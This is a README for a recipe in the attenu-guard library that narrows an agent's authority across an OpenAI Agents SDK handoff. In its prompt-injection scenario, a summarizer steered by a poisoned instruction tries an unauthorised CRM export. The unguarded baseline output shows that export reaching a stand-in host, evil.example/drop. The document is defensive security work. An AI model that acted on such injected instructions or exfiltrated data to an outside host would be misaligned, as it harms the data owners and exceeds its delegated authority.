# Authority that narrows across an OpenAI Agents SDK handoff

A recipe: an orchestrator hands off a summarization job to a summarizer over the
Agents SDK's own `handoffs=[...]` mechanism, the summarizer's Guard — minted at
the SDK's own `RunHooks.on_handoff` — is strictly narrower than the
orchestrator's, and a poisoned tool call the summarizer was never delegated is
denied before its body runs — with genuine execution-binding evidence on the
allowed call, a revocation that cuts off a call that was legal a moment earlier,
and a signed, offline-verifiable evidence bundle at the end.

This recipe is for `attenu_guard.adapters.openai_agents` — delegation/handoff
attenuation. The SDK's own visibility/invocation gates (`FunctionTool.is_enabled`,
MCP `tool_filter`, `Handoff.is_enabled`) are a different recipe, for issue
[#4618](https://github.com/openai/openai-agents-python/issues/4618)'s "one
policy, every capability" pattern: see [`one_policy/`](one_policy/README.md).
That recipe is about what the model can *see*; this one is about what crosses a
*handoff*.

Tested against **openai-agents 0.22.0** (Python 3.12; the SDK needs >=3.10,
attenu-guard supports 3.9+).

## What this recipe teaches

- **Declared delegation.** The orchestrator holds broad authority (`crm.*`,
  `mail.send`); `GuardRegistry.grant("summarizer", ...)` declares, up front,
  what the summarizer may hold if delegated to — a set your own code writes,
  not whatever the model asks for.
- **Monotonic narrowing, through the real minting path.** A grant that asks for
  *more* than the orchestrator holds (`payments.transfer`, a 10,000,000-row
  ceiling, a near-infinite TTL) is minted through the exact same
  `GuardRegistry.delegate(...)` call a real handoff uses, and comes back
  exactly as narrow as the orchestrator — never wider, however greedy the
  declared grant.
- **The child is minted at the handoff itself.** `DelegationGuardHooks` hooks
  `RunHooks.on_handoff` — the SDK's own callback, fired after the destination
  agent is resolved and *before* its first model call — so the summarizer's
  real, narrower Guard exists before it can act at all.
- **Fail closed before the tool body runs.** `guarded_tool(...)` authorizes
  every call against the *running* agent's Guard. Both agents hold the
  **identical tool objects** — a shorter tool list is not, and cannot be, the
  defense. A row-ceiling overreach *inside* an allowed scope, and a
  completely out-of-scope poisoned export, are both denied before their tool
  bodies ever execute — proven by a side-effect log the tools would otherwise
  have appended to.
- **A revocation that holds.** `registry.revoke("summarizer")` mid-run denies
  the summarizer's very next call — a read that was legal a moment earlier.
- **Genuine execution-binding evidence, opt-in.** Passing
  `guarded_tool(..., registry=registry)` makes the wrapper replace the tool's
  own `on_invoke_tool` — the exact callable the SDK awaits to run the tool
  body — with one that calls the *original* itself and reports what it
  actually observed. The allowed read's ledger entry then carries a real
  `Capture.WRAPPER_ASYNC` and an `authorized_params_hash` that matches the
  recorded `invoked_params_hash`. See [Trust boundary](#trust-boundary) for
  exactly what that equality does and does not prove.
- **Offline-verifiable evidence.** The audit log is exported as a signed
  bundle and checked back with the packaged `attenu-guard verify` command — a
  reviewer, or a regulator, needs only the public key, never this process or
  this repository.

## What it hooks

| # | Moment | OpenAI Agents SDK API (site-packages paths, verified at 0.22.0) |
|---|--------|----------------------------------|
| 1 | **Child creation** | `RunHooks.on_handoff(context, from_agent, to_agent)` (`agents/lifecycle.py:61`), invoked at `agents/run_internal/turn_resolution.py:614` — after the destination agent is resolved and *before* its first model call. `DelegationGuardHooks` mints the child's Guard right there via `GuardRegistry.delegate(...)`, from an authority set your own code declares. |
| 2 | **Tool invocation + execution binding** | `guarded_tool(..., registry=registry)` replaces the tool's `on_invoke_tool` (`agents/tool.py`'s `FunctionTool.on_invoke_tool`, the exact callable `_invoke_function_tool_with_metadata` awaits at `agents/tool.py:2129`) with a wrapper that authorizes, then calls the *original* `on_invoke_tool` directly and records the outcome from what it observed. |

Denials from this wrapper are the tool's own `on_invoke_tool` return contract —
a returned string (`on_denied="reject"`, the default: the model is told why and
the run continues) or a raised `AuthorityDenied` (`on_denied="raise"`: the SDK
wraps it in its own `UserError`, with the original exception preserved as
`__cause__`) — **not** `ToolGuardrailFunctionOutput`, which only a separate
`ToolInputGuardrail` return value can be. See the adapter's own module
docstring ("WHY AUTHORIZATION LIVES INSIDE `on_invoke_tool` TOO") for why
authorization moved off the `ToolInputGuardrail` path entirely on a
`schema_version=2` chain: pinned 0.22.0 runs *all* `tool_input_guardrails`
before invoking anything and can return without ever calling `on_invoke_tool`
if a *later*, third-party guardrail rejects first
(`agents/run_internal/tool_execution.py:2012-2042`) — which would otherwise
leak (or, under a reused `tool_call_id`, misattribute) a decision stashed by an
earlier, separate authorization hook. Omitting `registry=` keeps
`guarded_tool()` on the original `ToolInputGuardrail` path, byte-and-type
identical to every release before 0.9.0.

Everything fails closed: an agent nobody delegated to holds no Guard at all —
it does not fall back to its parent's — and unparsable arguments are refused
rather than checked against an unknown quantity.

## Prerequisites

- Python 3.10+ (the SDK's own floor; attenu-guard itself supports 3.9+)
- `openai-agents==0.22.0` (`pip install openai-agents==0.22.0`)
- No API key for the offline run below — the loop is driven by the SDK's own
  `agents.testing.ScriptedModel`, no network call is made
- `cryptography` for the evidence-bundle step (`Ed25519Signer`) — install via
  attenu-guard's own `crypto` extra if not already present
  (`pip install 'attenu-guard[crypto]'`)
- A real application consuming attenu-guard from PyPI would pin
  `attenu-guard>=0.10,<0.11`; this recipe lives inside the attenu-guard repo
  itself and imports `src/` directly (or the installed package, either
  works), so there is nothing to pin here

## Setup

From a checkout of this repository:

```bash
pip install -e '.[crypto]'
pip install openai-agents==0.22.0
```

## Run

```bash
python examples/integrations/openai_agents/demo.py                              # offline, no API key
python -m pytest -q tests/integrations/test_openai_agents.py \
                    tests/integrations/test_openai_agents_one_policy.py \
                    tests/integrations/test_openai_agents_recipe_demo.py         # 46 tests, offline
RUN_LIVE=1 OPENAI_API_KEY=... python examples/integrations/openai_agents/live_smoke.py
```

`live_smoke.py` runs the same node-level poisoned-summarizer story against a
real model; it is env-gated and never runs in CI. `test_openai_agents.py`
covers the adapter's generic conformance (26 tests); `test_openai_agents_one_policy.py`
covers the separate `one_policy/` recipe (19 tests); this recipe's own runnability
and assertions are `test_openai_agents_recipe_demo.py` (1 test).

## Expected output

Abridged; the run prints the full transcript, including the delegation graph
and the raw audit-log lines between sections 4 and 5.

```text
1. The authority the orchestrator holds, and what it will delegate
  orchestrator  Authority(scopes=['crm.*', 'mail.send'], ...)
  will delegate Authority(scopes=['crm.read'], ...)

2. What a greedy declared grant gets, through the SAME minting path (met down, never up)
  requested  Authority(scopes=['crm.*', 'mail.send', 'payments.transfer'], ...)
  granted    Authority(scopes=['crm.*', 'mail.send'], ...)
  narrower than parent? True
  'payments.transfer' granted? False

3. Running the agent loop: identical tools, attenuated authority
  both agents hold the identical tool objects: ['crm_query', 'crm_export']
      [TOOL BODY RAN] crm_query(rows=60000)
      [TOOL BODY RAN] crm_query(rows=4200)

  [operator] revoking the summarizer's authority mid-run...

  child Guard minted at the handoff (RunHooks.on_handoff): chain:n2
  child.is_narrower_than(orchestrator): True

  tool calls, in order:
    ALLOWED  orchestrator  crm_query(rows=60000)   in-authority read
    ALLOWED  summarizer    crm_query(rows=4200)    in-authority read
    DENIED   summarizer    crm_query(rows=60000)   ALLOWED SCOPE, over the row ceiling
              -> denied: ceiling_exceeded constraint=max_rows limit=5000 requested=60000
    DENIED   summarizer    crm_export(...)         the poisoned step
              -> denied: scope_not_granted requested=crm.export: scope 'crm.export' not covered by held scopes ['crm.read']; ceiling_exceeded constraint=egress limit=none requested=any
    DENIED   summarizer    crm_query(rows=10)      after revocation
              -> denied: revoked: node has been revoked

  tool bodies that actually executed:
    RAN     crm_query(rows=60000)
    RAN     crm_query(rows=4200)

  execution binding (opt-in via guarded_tool(..., registry=registry)):
    capture: wrapper_async
    authorized_params_hash == invoked_params_hash: True
    This is genuine WRAPPER capture, not an observation of the framework calling back
    afterward: guarded_tool() replaces this tool's own on_invoke_tool -- the exact
    callable the SDK awaits to run the body -- with a wrapper that calls the ORIGINAL
    on_invoke_tool itself and reports what it observed, in the same call.
    What authorized_params_hash == invoked_params_hash does NOT prove: it is one
    immutable snapshot of the parsed arguments, taken once before the call and reused
    for both hashes (attenu_guard.adapters.openai_agents._wrapped_invoke), not two
    independent readings compared -- it says nothing about what the tool body did with
    those arguments, and nothing about a call path that reaches a side effect without
    going through this wrapped on_invoke_tool at all.

4. Delegation graph
    (3 nodes printed here: orchestrator active, greedy-probe REVOKED, summarizer REVOKED)

5. The ledger, checked without this process
    (12 raw audit-log lines printed here: seq 0-11, one per root/spawn/kill/
    allow/outcome/deny event)

  12 events, hash chain: True

  bundle: (fresh temp dir)/evidence-bundle.json
  verifying it with the packaged command:
    attenu-guard verify evidence-bundle.json --pubkey ...
integrity=True monotonicity=True containment=True anchor=verified nodes=3 actions_checked=2
OK
  reviewer view: 3 nodes

6. BASELINE: the same agent tree, no guard installed
      [TOOL BODY RAN] crm_query(rows=4200)
      [TOOL BODY RAN] crm_export -> https://evil.example/drop   <-- EXFILTRATION

  tool bodies that actually executed:
    RAN     crm_query(rows=4200)
    RAN     crm_export(destination=https://evil.example/drop)

  CRM exported to an external URL without a guard installed? True
  The SDK still forwards the handoff and the poisoned instruction; nothing about
  the SDK's own handoff mechanics carries any authority across it -- both agents
  were handed the identical, unguarded tool objects, so the summarizer's export
  ability was never a matter of what tools it happened to be given.

RESULT: OK
```

The bundle path and the pubkey are different on every run (a fresh temp
directory and a fresh Ed25519 keypair each time); everything else is
deterministic.

`crm_export` is absent from the list of tool bodies that ran in section 3.

## Trust boundary

The adversary this addresses is the agent itself — a summarizer steered by a
poisoned tool response, a confused plan, or a bad system prompt into asking for
something outside its remit. The enforcement point runs in-process, inside the
tool's own `on_invoke_tool`, and holds:

- for any call routed through a `FunctionTool` built by `guarded_tool(...)` —
  through `Runner.run()`'s real dispatch, the only path exercised here. Code
  that reaches a side effect without going through `on_invoke_tool` at all is
  outside the checked path — same as any other library boundary.
- against permissions, not against content. The library takes no view on
  whether the export is a good idea; it holds the summarizer to what it was
  delegated.
- **`Capture.WRAPPER_ASYNC`, shown here because `registry=` was passed to
  `guarded_tool(...)`, is genuine wrapper capture, not an attestation about a
  framework hook the adapter cannot fully see.** `guarded_tool()` replaces the
  tool's own `on_invoke_tool` — the exact callable
  `_invoke_function_tool_with_metadata` awaits to run the body
  (`agents/tool.py:2129`) — with a wrapper that calls the *original*
  `on_invoke_tool` itself, in the same call, and reports what it actually
  observed. That is different from an adapter built on a framework's own
  *global* hook (like `attenu_guard.adapters.crewai`'s
  `before_tool_call`/`after_tool_call`), which cannot always prove it is the
  only thing registered on that hook, and so needs an opt-in attestation flag
  to make the stronger claim. There is no such flag here: `registry=` is
  opt-in for a different, structural reason — a `FunctionTool` object can be
  shared across several agents, and whether *any* of them ever runs against a
  `schema_version=2` chain is a whole-chain property the adapter checks once,
  at `guarded_tool()` build time, not something knowable per call. Omitting
  `registry=` (or building on a `schema_version=1` chain) keeps `guarded_tool()`
  on the original, pre-0.9.0 `ToolInputGuardrail` path, unconditionally — see
  the adapter's own module docstring, "WHY OPT-IN, NOT AUTOMATIC," for the
  full reasoning.
  **What `authorized_params_hash == invoked_params_hash` proves:** the
  parameters committed to the ledger as "authorized" and "invoked" are
  literally the same immutable snapshot of the tool's parsed arguments, taken
  once before the wrapper calls the original `on_invoke_tool`
  (`attenu_guard/adapters/openai_agents.py`'s `_wrapped_invoke`) — so the
  ledger cannot silently drift between what was checked and what is recorded
  as having run.
  **What it does NOT prove:** this is one observation reused for both
  records, not two independent readings compared — unlike
  `attenu_guard.adapters.langgraph`'s recipe, where a node function receives a
  *shared mutable* state object it can mutate in place after authorization
  (demonstrating the snapshot survives that mutation unmoved), this SDK's
  `@function_tool` bodies receive individually-typed keyword arguments the SDK
  itself re-parses from the same JSON string to invoke the underlying Python
  function — there is no analogous shared, mutable argument object for this
  recipe to run that same experiment against. It says nothing about what the
  tool body did with the arguments once invoked, and nothing about a call
  path that reaches the same side effect without going through this wrapped
  `on_invoke_tool` at all.
- **The handoff itself carries no filtering here.** By default, both
  `Handoff.input_filter` (`agents/handoffs/__init__.py:158`) and
  `RunConfig.handoff_input_filter` (`agents/run_config.py:338`) are `None`,
  and `RunConfig.nest_handoff_history` (`agents/run_config.py:346`) is
  `False` — when none of these is set, as in this recipe,
  `agents/run_internal/turn_resolution.py`'s handoff-resolution code
  (`input_filter is not None or should_nest_history`, line 653) never touches
  the accumulated input at all, so the *entire* prior conversation, poisoned
  instruction included, reaches the summarizer verbatim. This is exactly why
  the summarizer needs its own attenuated authority: the SDK does not, and is
  not trying to, keep poisoned content out of the child's context — that is
  what makes "the child can act on what it sees" and "the child may act only
  on what it was delegated" two different, and both necessary, properties.

It does not defend against an attacker with code execution in the same
process, who can edit the declared grants in this recipe's own `demo.py`
before they are loaded. Exported evidence is verified against a public key,
so a bundle altered after export fails verification with the key alone.

Writing the declared grants is your job, deliberately: they are declared
inline in `demo.py`'s `main()`, a short, reviewable block, and the wrapper
enforces exactly what it says.

## Files

| Path | What it holds |
|---|---|
| `demo.py` | The scripted-model run: the agents, the guarded tools, the greedy-grant clamp, the execution-binding check, the evidence export, the offline verification |
| `live_smoke.py` | Env-gated: the same scenario against a real model (`RUN_LIVE=1`, costs money, not run by CI) |
| `one_policy/` | A separate recipe for the SAME adapter's neighboring concern — issue #4618's visibility/invocation gates, not delegation attenuation |
| `../../../src/attenu_guard/adapters/openai_agents.py` | The shipped adapter (`attenu_guard.adapters.openai_agents`) this recipe drives |
| `../../../tests/integrations/test_openai_agents.py` | The adapter's own conformance suite (generic scenarios, not specific to this recipe) |
| `../../../tests/integrations/test_openai_agents_recipe_demo.py` | Runnability plus the enforcement assertions for THIS recipe specifically — asserts `demo.main()` itself returns 0 |

Versions this was checked against: `openai-agents` 0.22.0, `attenu-guard`
0.10.0, Python 3.12.

## License

This recipe is part of attenu-guard, licensed under the Apache License 2.0 —
see the repository's [`LICENSE`](../../../LICENSE) file for details.
